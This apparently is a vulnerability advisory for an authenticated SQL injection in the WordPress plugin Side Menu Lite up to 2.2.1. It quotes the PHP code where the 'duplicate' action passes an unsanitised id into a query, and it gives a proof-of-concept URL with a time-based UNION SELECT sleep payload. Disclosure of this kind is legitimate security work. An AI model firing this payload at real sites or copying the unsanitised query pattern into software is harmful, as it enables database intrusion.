# Side Menu Lite <= 2.2.1 - Authenticated SQL Injection
## Description
    The menu update functionality of the plugin, available to Administrator users takes the id GET parameter and uses it into an SQL statement without proper sanitisation, validation or escaping, therefore leading to a SQL Injection issue.   
## Affects Plugins
    Side Menu Lite <= 2.2.1 (the latest version at this time)
    https://wordpress.org/plugins/side-menu-lite/
## Author
    pang0lin@webray.com.cn inc 
## Detail
    The issue is occured at file side-menu-lite/admin/partials/include-data.php. When the parameter $act equals to 'duplicate', the parameter id is derectly used by mysql select sql. 
```
if ( $act == "update" ) {
	$rec_id = absint( $_REQUEST["id"] );
	$result = $wpdb->get_row( "SELECT * FROM $data WHERE id=$rec_id" );
	if ( $result ) {
		$id         = $result->id;
		$title      = $result->title;
		$param      = unserialize( $result->param );
		$tool_id    = $id;
		$add_action = 2;
		$btn        = esc_attr__( 'Update', $this->plugin['text'] );
	}
} elseif ( $act == "duplicate" ) {
	$rec_id = $_REQUEST["id"];
	$result = $wpdb->get_row( "SELECT * FROM $data WHERE id=$rec_id" );
	if ( $result ) {
		$id    = "";
		$title = "";
		$param = unserialize( $result->param );
		$last  = $wpdb->get_col( "SELECT id FROM $data" );;
		$tool_id    = max( $last ) + 1;
		$add_action = 1;
		$btn        = esc_attr__( 'Save', $this->plugin['text'] );
	}
} else {
	$id         = "";
	$title      = "";
	$last  = $wpdb->get_col( "SELECT id FROM $data" );
	$tool_id    = !empty($last) ?  max( $last ) + 1 : 1;
	$param      = '';
	$add_action = 1;
	$btn        = esc_attr__( 'Save', $this->plugin['text'] );
}

```
## Proof of Concept
http://192.168.65.26/wp/wp-admin/admin.php?page=side-menu-lite&tab=add-new&act=duplicate&id=0 union select 1,2,sleep(5)

Visit this page, it will sleep more than 5 seconds.
![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_side-menu_sqli.png "Wordpress plugin side-menu sqli")
